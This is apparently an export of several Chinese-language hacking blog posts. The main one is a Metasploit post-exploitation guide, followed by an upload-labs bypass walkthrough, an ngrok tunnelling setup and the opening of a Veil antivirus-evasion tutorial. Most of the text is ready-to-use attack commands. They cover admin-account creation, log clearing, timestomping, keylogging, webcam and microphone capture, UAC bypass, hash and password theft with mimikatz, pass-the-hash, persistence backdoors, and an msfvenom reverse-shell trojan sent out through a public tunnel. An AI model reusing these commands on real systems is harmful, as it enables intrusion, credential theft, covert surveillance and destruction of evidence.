 <figure class="highlight r"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=<span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>/<span class="number">24</span> <span class="comment">#arp扫描粗略的扫一眼目标内网的机器大概有多少</span></span><br></pre></td></tr></table></figure>
<p> 发现 192.168.85.128的主机</p>
<p> <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-16%2016-30-27%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
</li>
<li><p>socks代理</p>
 <figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#利用sock4a模块对目标内网代理，只能负责tcp的流量，并不是socks代理进去以后就什么都能搞了</span></span><br><span class="line">meterpreter &gt; background</span><br><span class="line">msf exploit(handler) &gt; use auxiliary/server/socks4a </span><br><span class="line">msf auxiliary(socks4a) &gt; set srvhost <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">msf auxiliary(socks4a) &gt; set srvport <span class="number">1111</span></span><br><span class="line">msf auxiliary(socks4a) &gt; run</span><br></pre></td></tr></table></figure>
<p> <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-16%2016-38-18%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p> 在proxychians.conf中设置好代理,就可以对目标进行正常的内网渗透了</p>
 <figure class="highlight r"><table><tr><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br><span class="line"><span class="comment">#在文件末尾添加socks4代理服务器</span></span><br></pre></td></tr></table></figure>
<p> <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2019-01-22%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p> 利用proxychains代理扫描并执行nmap操作</p>
 <figure class="highlight r"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT <span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>/<span class="number">24</span> -p1-<span class="number">100</span></span><br></pre></td></tr></table></figure>
<p> <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2020-25-22%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<ol start="4">
<li><p>发现存在80端口，google配置代理</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2020-17-29%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p>查看<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2021-00-09%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
</li>
</ol>
</li>
</ol>
<h2 id="获取内网win7的shell"><a href="#获取内网win7的shell" class="headerlink" title="获取内网win7的shell"></a>获取内网win7的shell</h2><ol>
<li><p>使用任意文件上传，获取路径</p>
<p> <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2021-40-53%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
</li>
<li><p>这里使用蚁剑连接</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2021-40-01%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
</li>
<li><p>可以看到win7 开启了3389端口<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2021-44-11%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
</li>
<li><p>这里开启并使用远程桌面</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建新的管理员账户(直接更改管理员密码 net user Administrator 123)</span></span><br><span class="line">whoami</span><br><span class="line">net user</span><br><span class="line">net user wk <span class="number">123</span> /add</span><br><span class="line">net localgroup administrators wk /add   <span class="comment">#wk加入管理员账户</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用远程桌面</span></span><br><span class="line">portfwd add -l <span class="number">2222</span> -p <span class="number">3389</span> -r <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  <span class="comment">#先将3389流量转发到代理服务器</span></span><br><span class="line">rdesktop <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">2222</span>     <span class="comment">#kali自带rdesktop</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2022-02-50%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="权限为系统权限"></p>
<p> <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2022-00-42%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p> <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-17%2022-08-53%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p> 我这里出现错误，下载的win 7的系统有问题，但是此时的用户是正常使用的。<br> <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%25IU1.png"></p>
<p> <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%25%24FXJE5F5.png"></p>
<p> 到此时，接下来的操作大家都懂的！</p>
</li>
</ol>
<h2 id="常用命令总结"><a href="#常用命令总结" class="headerlink" title="常用命令总结"></a>常用命令总结</h2><h4 id="execute执行文件"><a href="#execute执行文件" class="headerlink" title="execute执行文件"></a>execute执行文件</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">execute <span class="comment">#在目标机中执行文件</span></span><br><span class="line">execute -H -i -f  cmd.exe <span class="comment"># 创建新进程cmd.exe，-H不可见，-i交互</span></span><br><span class="line">execute -H -m -d notepad.exe -f payload.exe -a <span class="string">&quot;-o hack.txt&quot;</span></span><br><span class="line"><span class="comment"># -d 在目标主机执行时显示的进程名称（用以伪装）-m 直接从内存中执行</span></span><br><span class="line"><span class="string">&quot;-o hack.txt&quot;</span>是payload.exe的运行参数</span><br></pre></td></tr></table></figure>

<h4 id="migrate进程迁移"><a href="#migrate进程迁移" class="headerlink" title="migrate进程迁移"></a>migrate进程迁移</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">getpid    <span class="comment"># 获取当前进程的pid</span></span><br><span class="line">ps   <span class="comment"># 查看当前活跃进程</span></span><br><span class="line">migrate &lt;pid值&gt;    <span class="comment"># 将Meterpreter会话移植到指定pid值进程中</span></span><br><span class="line">kill &lt;pid值&gt;   <span class="comment"># 杀死进程</span></span><br></pre></td></tr></table></figure>
<h4 id="clearev清除日志"><a href="#clearev清除日志" class="headerlink" title="clearev清除日志"></a>clearev清除日志</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">clearev  <span class="comment"># 清除windows中的应用程序日志、系统日志、安全日志</span></span><br></pre></td></tr></table></figure>
<h4 id="timestomp伪造时间戳"><a href="#timestomp伪造时间戳" class="headerlink" title="timestomp伪造时间戳"></a>timestomp伪造时间戳</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">timestomp C:\\ -h   <span class="comment">#查看帮助</span></span><br><span class="line">timestomp -v C:\\<span class="number">2.</span>txt   <span class="comment">#查看时间戳</span></span><br><span class="line">timestomp C:\\<span class="number">2.</span>txt -f C:\\<span class="number">1.</span>txt <span class="comment">#将1.txt的时间戳复制给2.txt</span></span><br><span class="line">timestomp  c:\\test\\<span class="number">22.</span>txt -z <span class="string">&quot;03/10/2019 11:55:55&quot;</span> -v <span class="comment"># 把四个属性设置为统一时间</span></span><br></pre></td></tr></table></figure>

<h4 id="portfwd端口转发"><a href="#portfwd端口转发" class="headerlink" title="portfwd端口转发"></a>portfwd端口转发</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">portfwd add -l <span class="number">1111</span> -p <span class="number">3389</span> -r <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="comment">#将目标机的3389端口转发到本地1111端口</span></span><br><span class="line">rdesktop <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1111</span> <span class="comment"># 需要输入用户名密码连接</span></span><br><span class="line">rdesktop -u Administrator -p <span class="number">123</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1111</span> <span class="comment"># -u 用户名 -p 密码</span></span><br></pre></td></tr></table></figure>

<h4 id="autoroute添加路由"><a href="#autoroute添加路由" class="headerlink" title="autoroute添加路由"></a>autoroute添加路由</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">run autoroute -h <span class="comment"># 查看帮助</span></span><br><span class="line">run get_local_subnets <span class="comment"># 查看目标内网网段地址</span></span><br><span class="line">run autoroute -s <span class="number">192.168</span><span class="number">.183</span><span class="number">.0</span>/<span class="number">24</span>  <span class="comment"># 添加目标网段路由</span></span><br><span class="line">run autoroute -p  <span class="comment"># 查看添加的路由</span></span><br></pre></td></tr></table></figure>
<h4 id="利用arp-scanner、portscan等进行扫描"><a href="#利用arp-scanner、portscan等进行扫描" class="headerlink" title="利用arp_scanner、portscan等进行扫描"></a>利用arp_scanner、portscan等进行扫描</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=<span class="number">192.168</span><span class="number">.183</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=<span class="number">192.168</span><span class="number">.183</span><span class="number">.146</span> PORTS=<span class="number">3389</span></span><br></pre></td></tr></table></figure>

<h4 id="Socks代理"><a href="#Socks代理" class="headerlink" title="Socks代理"></a>Socks代理</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvhost <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">set srvport <span class="number">2000</span></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 然后vim /etc/proxychains.conf ，在文件末尾添加socks4代理服务器</span></span><br><span class="line">socks4 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">2000</span></span><br><span class="line">proxychains nmap -Pn -sT <span class="number">192.168</span><span class="number">.80</span><span class="number">.129</span> -p1-<span class="number">1000</span>   <span class="comment">#proxychains代理访问执行nmap操作</span></span><br></pre></td></tr></table></figure>
<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">keyscan_start  <span class="comment"># 开始键盘记录</span></span><br><span class="line">keyscan_dump   <span class="comment"># 导出记录数据</span></span><br><span class="line">keyscan_stop   <span class="comment"># 结束键盘记录</span></span><br></pre></td></tr></table></figure>
<h4 id="网络摄像头"><a href="#网络摄像头" class="headerlink" title="网络摄像头"></a>网络摄像头</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">record_mic　 <span class="comment"># 音频录制</span></span><br><span class="line">webcam_chat  <span class="comment"># 开启视频聊天(对方有弹窗）</span></span><br><span class="line">webcam_list  <span class="comment"># 查看摄像头</span></span><br><span class="line">webcam_snap  <span class="comment"># 通过摄像头拍照</span></span><br><span class="line">webcam_stream  <span class="comment"># 通过摄像头开启视频监控(以网页形式进行监控≈直播）</span></span><br></pre></td></tr></table></figure>
<h4 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">screenshot  <span class="comment"># 截屏</span></span><br><span class="line">use espia  <span class="comment"># 使用espia模块</span></span><br><span class="line">screengrab  <span class="comment"># 截屏</span></span><br></pre></td></tr></table></figure>
<h4 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h4><p>msf内置一些bypassuac脚本，原理不同，使用方法类似，执行后返回一个新的会话，执行getsystem即可提权</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_injection_winsxs</span><br><span class="line">exploit/windows/local/bypassuac_silentcleanup</span><br><span class="line">exploit/windows/local/bypassuac_vbs</span><br><span class="line"></span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session <span class="number">1</span></span><br><span class="line">run</span><br><span class="line">getsystem</span><br></pre></td></tr></table></figure>

<h4 id="窃取hash及密码-amp-哈希传递"><a href="#窃取hash及密码-amp-哈希传递" class="headerlink" title="窃取hash及密码&amp;哈希传递"></a>窃取hash及密码&amp;哈希传递</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 窃取hash及密码</span></span><br><span class="line">hashdump</span><br><span class="line">run post/windows/gather/smart_hashdump</span><br><span class="line">得到的hash可以拿去https://cmd5.com/ 解密一下即是用户密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#mimikatz</span></span><br><span class="line">load mimikatz <span class="comment"># 加载mimikatz模块</span></span><br><span class="line">msv  <span class="comment"># 获取用户和hash值 </span></span><br><span class="line">kerberos  <span class="comment"># 获取内存中的明文密码信息</span></span><br><span class="line">wdigest  <span class="comment"># 获取内存中的明文密码信息</span></span><br><span class="line">mimikatz_command -f a:: <span class="comment"># 需要以错误的模块来让正确的模块显示</span></span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords <span class="comment"># 获取用户密码</span></span><br><span class="line">mimikatz_command -f samdump::hashes  <span class="comment"># 执行用户hash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#哈希传递</span></span><br><span class="line"><span class="comment">#利用hashdump得到用户的hash后可利用psexec模块进行哈希传递攻击。</span></span><br><span class="line">使用psexec的前提：SMB服务必须开启，也就是开启<span class="number">445</span>端口；Admin$可以访问</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST <span class="number">192.168</span><span class="number">.183</span><span class="number">.147</span></span><br><span class="line">set LPORT <span class="number">443</span></span><br><span class="line">set RHOST <span class="number">192.168</span><span class="number">.183</span><span class="number">.154</span></span><br><span class="line">set SMBUSER Administrator</span><br><span class="line">set SMBPASS ccf**4ee:3db**<span class="number">678</span></span><br><span class="line">set SMBDOMAIN  WORKGROUP   <span class="comment"># 域用户需要设置SMBDOMAIN</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h4 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#getgui命令</span></span><br><span class="line"><span class="comment">#这里需要注意的是通过getgui命令，虽然可以成功添加用户，但是没有权限远程登录桌面，这里推荐使用enable_rdp脚本添加。</span></span><br><span class="line">run getgui –h  <span class="comment"># 查看帮助</span></span><br><span class="line">run getgui -e  <span class="comment"># 开启远程桌面</span></span><br><span class="line">run getgui -u admin -p admin  <span class="comment"># 添加用户</span></span><br><span class="line">run getgui -f <span class="number">6666</span> -e  <span class="comment"># 3389端口转发到6666</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#enable_rdp脚本</span></span><br><span class="line"><span class="comment">#通过enable_rdp脚本将用户添加到远程桌面用户组和管理员用户组</span></span><br><span class="line">run post/windows/manage/enable_rdp  <span class="comment">#开启远程桌面</span></span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=admin <span class="comment"># 添加用户</span></span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=<span class="number">6667</span>  <span class="comment"># 将3389端口转发到6667</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#远程桌面</span></span><br><span class="line">enumdesktops  <span class="comment"># 查看可用的桌面</span></span><br><span class="line">getdesktop    <span class="comment"># 获取当前meterpreter 关联的桌面</span></span><br><span class="line">setdesktop    <span class="comment"># 设置meterpreter关联的桌面  -h查看帮助</span></span><br><span class="line">run vnc   <span class="comment"># 使用vnc远程桌面连接</span></span><br><span class="line">rdesktop <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1111</span> <span class="comment"># 需要输入用户名密码连接</span></span><br><span class="line">rdesktop -u Administrator -p <span class="number">123</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1111</span> <span class="comment"># -u 用户名 -p 密码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="后门植入"><a href="#后门植入" class="headerlink" title="后门植入"></a>后门植入</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Persistence(通过启动项安装)</span></span><br><span class="line">run persistence –h  <span class="comment"># 查看帮助</span></span><br><span class="line">run persistence -X -i <span class="number">5</span> -p <span class="number">4444</span> -r <span class="number">192.168</span><span class="number">.183</span><span class="number">.147</span> </span><br><span class="line">run persistence -U -i <span class="number">5</span> -p <span class="number">4444</span> -r <span class="number">192.168</span><span class="number">.183</span><span class="number">.147</span> -L c:\\Windows\\System32</span><br><span class="line">-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限原因会导致添加失败，后门无法启动。因此在非管理员权限下，不推荐使用该参数</span><br><span class="line">-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息</span><br><span class="line">-L：后门传到远程主机的位置默认为%TEMP%</span><br><span class="line">-i：设置反向连接间隔时间为<span class="number">5</span>秒</span><br><span class="line">-p：设置反向连接的端口号</span><br><span class="line">-r：设置反向连接的ip地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs通关攻略</title>
    <url>/2019/11/20/upload-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>upload上传是比较基本的web漏洞，看到很多的大佬发布的钓鱼，人肉都用到过upload获取shell。个人感觉这个总结起来也比较方便简单。</p>
<a id="more"></a>

<hr>
<p><strong>项目地址：</strong></p>
<p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
<h2 id="Upload-labs练习："><a href="#Upload-labs练习：" class="headerlink" title="Upload-labs练习："></a>Upload-labs练习：</h2><h4 id="class-1-js限制文件上传"><a href="#class-1-js限制文件上传" class="headerlink" title="class-1 js限制文件上传"></a>class-1 js限制文件上传</h4><p>前端限制后缀名，上传jpg文件，拦包改后缀绕过</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/EQ6%24_TDU.png"></p>
<p>这里可以看到成功上传</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/IXLM%7DG7PMKW.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/QF%5BHA%7D%5BZT.png"></p>
<h4 id="class-2-MIME限制文件上传"><a href="#class-2-MIME限制文件上传" class="headerlink" title="class-2 MIME限制文件上传"></a>class-2 MIME限制文件上传</h4><p>上传php文件，显示类型不正确，实际上MIME验证就是检测Content-type字段值的，直接更改上传数据包中的Content-type(image/jpeg、image/png、image/gif)即可绕过</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/FQ78VP%60B7V5.png"></p>
<p>修改Content-type值为图片的格式（image/jpeg），成功绕过</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/3YQDUP_SBN21.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/K8AUCXKP%40I2KU%402D1O788VY.png"></p>
<h4 id="class-3-黑名单限制"><a href="#class-3-黑名单限制" class="headerlink" title="class-3 黑名单限制"></a>class-3 黑名单限制</h4><p>通过上传不受欢迎的php扩展来绕过黑名单。例如：pht，phpt，phtml，php3，php4，php5，php6</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7E%40QC%5B5GWHL7_8O50XNED%24UA.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/4G%24%7ED%5B%2587STM3.png"></p>
<p>服务器已经解析为php<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/UKQ_W5NXW.png"></p>
<h4 id="class-4-htaccess绕过"><a href="#class-4-htaccess绕过" class="headerlink" title="class-4 .htaccess绕过"></a>class-4 .htaccess绕过</h4><p>phpstudy打开配置文件 httpd-conf<br>AllowOverride None –&gt; AllowOverride All<br>前提条件（1.mod_rewrite模块开启。2.AllowOverride All）</p>
<p>虽然还是黑名单，但几乎过滤了所有有问题的后缀名，除了.htaccess，于是首先上传一个.htaccess内容如下的文件:</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/QXNJAQ1.png"></p>
<p>这样所有文件都会解析为php，然后再上传图片马，可以解析绕过</p>
<p><img src=""></p>
<h4 id="class-5-点-空格-点绕过"><a href="#class-5-点-空格-点绕过" class="headerlink" title="class-5 点+空格+点绕过"></a>class-5 点+空格+点绕过</h4><p>代码先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar函数来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7BW%7EV256%7DNIN1%7BR41.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/6Y259%608QCF.png"></p>
<h4 id="class-6-大小写绕过"><a href="#class-6-大小写绕过" class="headerlink" title="class-6 大小写绕过"></a>class-6 大小写绕过</h4><h4 id="class-7"><a href="#class-7" class="headerlink" title="class-7"></a>class-7</h4>]]></content>
      <categories>
        <category>OWASP</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>vps配置ngrok反向代理</title>
    <url>/2019/09/13/vps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>作为内网用户我们有时需要本地WEB外网访问、本地开发微信、TCP端口转发，而ngrok能提供web的演示</p>
<a id="more"></a>

<hr>
<h3 id="1-起因"><a href="#1-起因" class="headerlink" title="1 起因:"></a>1 起因:</h3><p><strong>自己搭建的ngrok挂掉了</strong></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVTv8QqMMKzoLaVACw_-LoVU-4q8fTZhMIn0mke_2019-09-11%2008-08-21%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<h3 id="2-更换ngrok-cc的客户端"><a href="#2-更换ngrok-cc的客户端" class="headerlink" title="2 更换ngrok.cc的客户端"></a>2 更换ngrok.cc的客户端</h3><h4 id="2-1-开通一个免费的隧道。"><a href="#2-1-开通一个免费的隧道。" class="headerlink" title="2.1 开通一个免费的隧道。"></a>2.1 开通一个免费的隧道。</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVUXCTyxmLvOZFFRb1_-LoVUnBGBgOxzNjbHIW1_QQ%E5%9B%BE%E7%89%8720190911201909.png" alt="选择免费的"></p>
<h4 id="2-2-开通你的隧道"><a href="#2-2-开通你的隧道" class="headerlink" title="2.2  开通你的隧道"></a>2.2  开通你的隧道</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets.png"></p>
<p>隧道协议选tcp，之后要用metasploit结合ngrok</p>
<p>隧道名称随意</p>
<p>端口选择只要不是服务器端口就好</p>
<p>本地端口选择kali 的内网地址</p>
<h4 id="2-3管理隧道"><a href="#2-3管理隧道" class="headerlink" title="2.3管理隧道"></a>2.3管理隧道</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoV%40IG.png"></p>
<p>下载客户端</p>
<p>记录好隧道id</p>
<h4 id="2-4-kali下安装客户端测试"><a href="#2-4-kali下安装客户端测试" class="headerlink" title="2.4 kali下安装客户端测试"></a>2.4 kali下安装客户端测试</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装路径下执行</span></span><br><span class="line">root@kali:~<span class="comment"># ./sunny clientid id</span></span><br><span class="line"><span class="comment">#出现online表明成功</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVVI_LuEGMO4yZbsh8_-LoVVO3UyeLRO-Xnm4YI_Inked2019-09-11%2008-33-47%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_LI.jpg"></p>
<p>现在可以启用web，打开127.0.0.1:4040查看管理。需要设置apache2的端口为端口为kali内的端口，开启apache2的服务</p>
<h3 id="3-测试metasploit结合ngrok内网穿透"><a href="#3-测试metasploit结合ngrok内网穿透" class="headerlink" title="3 测试metasploit结合ngrok内网穿透"></a>3 测试metasploit结合ngrok内网穿透</h3><h4 id="3-1-生成木马（未免杀）"><a href="#3-1-生成木马（未免杀）" class="headerlink" title="3.1 生成木马（未免杀）"></a>3.1 生成木马（未免杀）</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=free.idcfen*** LPORT=<span class="number">123</span>** -f exe &gt; /root/Desktop/ngrok.exe</span><br></pre></td></tr></table></figure>

<h4 id="3-2-使用Metasploit进行测试"><a href="#3-2-使用Metasploit进行测试" class="headerlink" title="3.2 使用Metasploit进行测试"></a>3.2 使用Metasploit进行测试</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost <span class="number">192.168</span><span class="number">.200</span><span class="number">.128</span>(Kali的Linux内网IP)</span><br><span class="line">set lport <span class="number">1000</span> (隧道的端口号)</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVVTv2GyLgE9_tkQm4_-LoVVoKcjVmGXJ.png"></p>
<p>成功获取shell，不同网段。</p>
<h3 id="4-端口选择"><a href="#4-端口选择" class="headerlink" title="4 端口选择"></a>4 端口选择</h3><p><strong>以下为服务端口，不可用选用</strong><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fczE%24I.png"></p>
]]></content>
      <categories>
        <category>vps</category>
      </categories>
      <tags>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title>veil制作免杀payload</title>
    <url>/2019/10/05/%E5%85%8D%E6%9D%80veil%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>简介:<br>Veil3.0可以将任意脚本或一段shellcode转换成Windows可执行文件，从而逃避了常见防病毒产品的检测，来自python3的Veil一直在更新。</p>
<a id="more"></a>

<hr>
<h2 id="kali安装"><a href="#kali安装" class="headerlink" title="kali安装"></a>kali安装</h2><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">root@kali<span class="symbol">:~</span><span class="comment"># apt -y install veil</span></span><br><span class="line">root@kali<span class="symbol">:~</span><span class="comment"># /usr/share/veil/config/setup.sh --force --silent</span></span><br></pre></td></tr></table></figure>
<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><ul>
<li>在Kali上运行Veil，生成payload</li>
<li>如果使用的是Pyinstaller，payload会转成能够直接使用的可执行程序</li>
<li>如果使用的是Py2Exe，把payload.py和两个相关的文件放到windows系统上。执行批处理脚本将payload转换成可执行程序。</li>
</ul>
<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="启动veil"><a href="#启动veil" class="headerlink" title="启动veil"></a>启动veil</h3><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/test2.png" alt="avatar"></p>
<p>有两个免杀的工具，Evasion和Ordnance。</p>
<ul>
<li>Ordnance可生成在Veil-Evasion中使用的shellcode</li>
<li>Evasion是用做文件免杀<br>我们选择Evasion<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">Veil&gt;: use <span class="number">1</span>                   <span class="comment">#选择Evasion功能</span></span><br><span class="line">Veil/Evasion&gt;: list            <span class="comment">#查看payload列表</span></span><br></pre></td></tr></table></figure>
